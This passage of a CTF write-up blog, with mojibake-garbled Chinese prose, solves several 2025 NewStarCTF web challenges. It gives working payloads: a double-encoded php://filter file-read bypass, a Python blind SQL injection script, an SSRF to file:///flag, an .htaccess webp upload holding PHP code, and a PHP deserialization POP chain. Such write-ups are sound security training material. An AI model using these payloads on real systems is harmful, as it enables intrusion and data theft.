class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>    <span class="hljs-variable">$waf</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;zip&#x27;</span>,<span class="hljs-string">&#x27;rar&#x27;</span>,<span class="hljs-string">&#x27;filter&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$waf</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$waf_word</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$waf_word</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf:&quot;</span>.<span class="hljs-variable">$waf_word</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_output</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-variable">$waf</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$waf</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$waf_word</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$waf_word</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf:&quot;</span>.<span class="hljs-variable">$waf_word</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-variable">$decoded</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$decoded</span> === <span class="hljs-literal">false</span> || <span class="hljs-variable">$decoded</span> === <span class="hljs-variable">$data</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$decoded</span>;<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$waf</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$waf_word</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$waf_word</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf:&quot;</span>.<span class="hljs-variable">$waf_word</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_output</span>(<span class="hljs-variable">$data</span>) !== <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªå¯¹è¾“å…¥åšwafï¼Œä¸€ä¸ªå¯¹è¾“å‡ºåšwaf</p><p>filter()å‡½æ•°æœ‰ä¸€ä¸ªwaf_wordåˆ—è¡¨ï¼Œfilter_output()å‡½æ•°æ£€æŸ¥è¾“å‡ºæ˜¯å¦å«fæˆ–ç»è¿‡base64è§£ç åæ˜¯å¦å«f</p><p>åœ¨æºç ä¸­ï¼Œè¾“å…¥æ£€æŸ¥å®Œæˆåä¼šè¿›è¡Œä¸€ä¸ªurldecodeçš„æ“ä½œï¼Œç„¶ååœ¨è¿›è¡Œè¯»æ–‡ä»¶ï¼Œæœ€åå¯¹è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹åšè¾“å‡ºæ£€æŸ¥</p><p>filter()å‡½æ•°å¯ä»¥ç”¨åŒé‡urlç¼–ç ç»•è¿‡ï¼Œfilter_output()å‡½æ•°å¯ä»¥å°è¯•ç”¨rot13ç»•è¿‡</p><p>åŸå§‹payload</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">url<span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span><span class="hljs-keyword">read</span>=string.rot13<span class="hljs-regexp">/resource=/</span>flag<br></code></pre></td></tr></table></figure><p>ç¼–ç å</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%61</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%63</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%66</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%63</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%36</span><span class="hljs-variable">%37</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ç»è¿‡rot13ç¼–ç åçš„flag</p><p><img src="/../images/2025NewStarCTF/ez_chain.png"></p><p>å†æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£ç å³å¯</p><h3 id="ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ2ï¼‰"><a href="#ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ2ï¼‰" class="headerlink" title="ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ2ï¼‰"></a>ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ2ï¼‰</h3><p>åº”è¯¥è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨å¤šå±‚æ‹¬å·åµŒå¥—ç»•è¿‡</p><p><img src="/../images/2025NewStarCTF/xiaok2_2.png"></p><p>æ²¡æœ‰è¿”å›å…·ä½“ä¿¡æ¯ï¼Œé‡‡ç”¨å­—ç¬¦ç›²æ³¨</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://eci-2ze1z5kqbpj5vtki6qyd.cloudeci1.ichunqiu.com:80/search&quot;</span><br><br>dbName = <span class="hljs-string">&#x27;Flag&#x27;</span><br>tbName = <span class="hljs-string">&#x27;flag&#x27;</span><br>colName = <span class="hljs-string">&#x27;flag&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        <span class="hljs-comment">#payload = &quot;amiya&#x27;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&lt;%d)^1#&quot; % (i,mid)</span><br>        <span class="hljs-comment">#payload = f&quot;amiya&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;&#123;dbName&#125;&#x27;)),%d,1))&lt;%d)^1#&quot; % (i,mid)</span><br>        <span class="hljs-comment">#payload = f&quot;amiya&#x27;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;&#123;dbName&#125;&#x27;)and(table_name=&#x27;&#123;tbName&#125;&#x27;)),%d,1))&lt;%d)^1#&quot; % (i,mid)</span><br>        payload = <span class="hljs-string">f&quot;amiya&#x27;^(ascii(substr((select(<span class="hljs-subst">&#123;colName&#125;</span>)from(<span class="hljs-subst">&#123;dbName&#125;</span>.<span class="hljs-subst">&#123;colName&#125;</span>)),%d,1))&lt;%d)^1#&quot;</span> % (i,mid)<br>        para = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: payload&#125;<br>        res = requests.post(url, data=para)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#123;&quot;status&quot;:&quot;ok&quot;,&quot;message&quot;:&quot;Found&quot;&#125;&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">128</span>:<br>        <span class="hljs-keyword">break</span><br>    flag += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag: &#x27;</span>, flag)<br><br><span class="hljs-comment"># database:  mysql,information_schema,performance_schema,sys,Terra,Flag</span><br><span class="hljs-comment"># tbName:  flag</span><br><span class="hljs-comment"># colName:  flag</span><br><br></code></pre></td></tr></table></figure><h3 id="mygo"><a href="#mygo" class="headerlink" title="mygo!!!"></a>mygo!!!</h3><p>æŸ¥çœ‹é¡µé¢æºç å‘ç°</p><p><img src="/../images/2025NewStarCTF/mygo1.png"></p><p>å¯ä»¥é€šè¿‡<code>index.php?proxy=$&#123;encodeURIComponent(url)&#125;</code>è¯»æ–‡ä»¶</p><p>dirsearchç›®å½•æ‰«æå‘ç°ä¸€ä¸ª<code>flag.php</code>æ–‡ä»¶ï¼Œå°è¯•è¯»å–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/index.php?proxy=http:/</span><span class="hljs-regexp">/localhost/</span>flag.php<br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$client_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><span class="hljs-comment">// åªå…è®¸æœ¬åœ°è®¿é—®</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$client_ip</span> !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-variable">$client_ip</span> !== <span class="hljs-string">&#x27;::1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ æ˜¯å¤–åœ°äººï¼Œæˆ‘åªè¦\&quot;æœ¬åœ°\&quot;äºº&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;soyorin&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;soyorin&#x27;</span>];<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨æ ¹ç›®å½•&quot;</span>;<br>    <span class="hljs-comment">// æ™®é€šè¯·æ±‚</span><br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">false</span>); <span class="hljs-comment">// ç›´æ¥è¾“å‡ºç»™æµè§ˆå™¨</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_BUFFERSIZE, <span class="hljs-number">8192</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æç¤ºflagåœ¨æ ¹ç›®å½•ï¼Œç›´æ¥è¯»</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">url<span class="hljs-regexp">/index.php?proxy=http:/</span><span class="hljs-regexp">/localhost/</span>flag.php?soyorin=<span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag</span><br></code></pre></td></tr></table></figure><h3 id="å°Eçš„ç§˜å¯†è®¡åˆ’"><a href="#å°Eçš„ç§˜å¯†è®¡åˆ’" class="headerlink" title="å°Eçš„ç§˜å¯†è®¡åˆ’"></a>å°Eçš„ç§˜å¯†è®¡åˆ’</h3><p>dirsearchç›®å½•æ‰«æï¼Œå‘ç°å¤‡ä»½æ–‡ä»¶<code>www.zip</code></p><p>ä¸‹è½½åˆ°æœ¬åœ°è§£å‹ç¼©ï¼Œæœ‰ä¸€ä¸ª<code>login.php</code>ï¼Œæç¤º<code>åœ¨gité‡Œæ‰¾æ‰¾å§</code></p><p>ç”¨<a href="https://github.com/gakki429/Git_Extract">git_extract</a>è‡ªåŠ¨åŒ–æå–å†å²æˆ–å®Œæ•´ç‰ˆå…ƒæ•°æ®ï¼ˆéœ€è¦ç”¨python2ç¯å¢ƒè¿è¡Œï¼‰</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python git_extract.py ./public-555edc76-<span class="hljs-number">9621</span>-<span class="hljs-number">4997</span>-<span class="hljs-number">86b9</span>-<span class="hljs-number">01483a50293e</span>/.git<br></code></pre></td></tr></table></figure><p>æ–°å¾—åˆ°ä¸€ä¸ªtips.txtå’Œuser.phpï¼Œuser.phpä¸­æœ‰usernameå’Œpassword</p><p>å»<code>/public-555edc76-9621-4997-86b9-01483a50293e/index.html</code>ä¸‹ç™»å½•ï¼Œè·å¾—æç¤º<code>å°Eæ‹¿macå†™çš„è¿™æ®µä»£ç ã€‚è¿™ä¼šæ³„éœ²ä»€ä¹ˆå—ï¼Ÿ          </code></p><p>å†ç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°<code>.DS_Store</code>ï¼Œç”¨<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a>è§£æ.DS_Storeæ–‡ä»¶å¹¶é€’å½’åœ°ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œå¾—åˆ°flagæ–‡ä»¶</p><p><img src="/../images/2025NewStarCTF/xiaoedemmjh.png"></p><p>ç”¨è®°äº‹æœ¬æ‰“å¼€å°±æ˜¯flag</p><h3 id="mirror-gate"><a href="#mirror-gate" class="headerlink" title="mirror_gate"></a>mirror_gate</h3><p>æŸ¥çœ‹æºç ï¼Œå‘ç°</p><p>![](..&#x2F;images&#x2F;2025NewStarCTF&#x2F;mirror_ gate1.png)</p><p>è§£ç <code>something_is_in_/uploads/</code>ï¼Œdirsearchæ‰«ä¸€ä¸‹<code>uploads/</code>ç›®å½•ï¼Œå‘ç°<code>.htaccess</code></p><p>æŸ¥çœ‹ä¸‹å†…å®¹æ˜¯<code>AddType application/x-httpd-php .webp</code></p><p>æ¥ä¸‹æ¥ä¸Šä¼ <code>webp</code>æ–‡ä»¶ï¼Œç„¶åå°è¯•å»è¯»<code>flag.php</code></p><p><code>&lt;?= readfile(&#39;/flag.php&#39;); ?&gt;</code>ä¿å­˜ä¸ºwebpæ–‡ä»¶ï¼Œä¸Šä¼ åå†è®¿é—®å³å¯æ‹¿åˆ°flag</p><h3 id="whoâ€™ssti"><a href="#whoâ€™ssti" class="headerlink" title="whoâ€™ssti"></a>whoâ€™ssti</h3><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="å°ç¾Šèµ°è¿·å®«"><a href="#å°ç¾Šèµ°è¿·å®«" class="headerlink" title="å°ç¾Šèµ°è¿·å®«"></a>å°ç¾Šèµ°è¿·å®«</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">startPoint</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$direction</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;gogogoå‡ºå‘å’¯ &quot;</span>;<br>        <span class="hljs-variable">$way</span> = <span class="hljs-variable language_">$this</span>-&gt;direction;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$way</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Treasure</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$door</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$chest</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ‹¿åˆ°é’¥åŒ™å’¯ï¼Œå¼€é—¨ï¼ &quot;</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; door -&gt; <span class="hljs-title function_ invoke__">open</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å°ç¾ŠçœŸå¯çˆ±! &quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span> -&gt; chest -&gt; key;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SaySomething</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¯´ç‚¹ä»€ä¹ˆå‘¢ &quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è¯´ï¼š &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sth;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">endPoint</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$path</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;åˆ°è¾¾ç»ˆç‚¹ï¼ç°åœ¨å°è¯•è·å–flagå§&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;path);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ma_ze.path&quot;</span>])&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ma_ze.path&quot;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿™ä¸ªå˜é‡åæœ‰ç‚¹å¥‡æ€ªï¼Œè¦æ€ä¹ˆä¼ å‚å‘¢ï¼Ÿ&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>    <br></code></pre></td></tr></table></figure><p>popé“¾</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">startPoint<span class="hljs-punctuation">#</span><span class="hljs-keyword">__wakeup</span><span class="hljs-params">()</span>==&gt;SaySomething<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Treasure<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Treasure<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span>==&gt;endPoint<span class="hljs-punctuation">#</span><span class="hljs-keyword">__call</span><span class="hljs-params">()</span>==&gt;file_get_contents()<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 